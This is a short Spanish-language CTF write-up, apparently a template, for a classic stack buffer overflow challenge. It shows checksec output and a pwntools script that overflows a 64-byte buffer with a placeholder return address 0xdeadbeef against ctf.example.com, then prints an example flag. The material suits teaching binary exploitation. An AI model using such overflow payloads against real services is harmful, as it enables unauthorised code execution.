---
title: "Buffer Overflow Básico - CTF Example 2024"
description: "Explotar un buffer overflow clásico para obtener ejecución de código arbitrario."
ctfName: "CTF Example 2024"
category: "pwn"
difficulty: "medium"
points: 250
pubDate: 2024-11-01
heroImage: "/images/ctf/default-ctf.png"
tags: ["pwn", "buffer-overflow", "binary-exploitation", "x86"]
language: es
solves: 856
author: "CTF Team"
skillLevel: "intermediate"
estimatedTime: "60-90 minutos"
tools: ["gdb", "pwntools", "python"]
---

# Buffer Overflow Básico - CTF Example 2024

## Descripción

Este reto presenta un binario vulnerable a un buffer overflow clásico. El objetivo es sobrescribir la dirección de retorno para ejecutar código arbitrario.

## Análisis Inicial

Primero verificamos las protecciones del binario:

```bash
checksec vulnerable_binary
```

Resultado:
- NX: Disabled
- PIE: No
- Stack Canary: No

## Explotación

Con las protecciones deshabilitadas, podemos sobrescribir el return address:

```python
from pwn import *

# Conectar al servidor
p = remote('ctf.example.com', 1337)

# Payload
payload = b'A' * 64
payload += p32(0xdeadbeef)  # Return address

p.sendline(payload)
p.interactive()
```

## Flag

`CTF{example_buff3r_0v3rfl0w_pwn3d}`
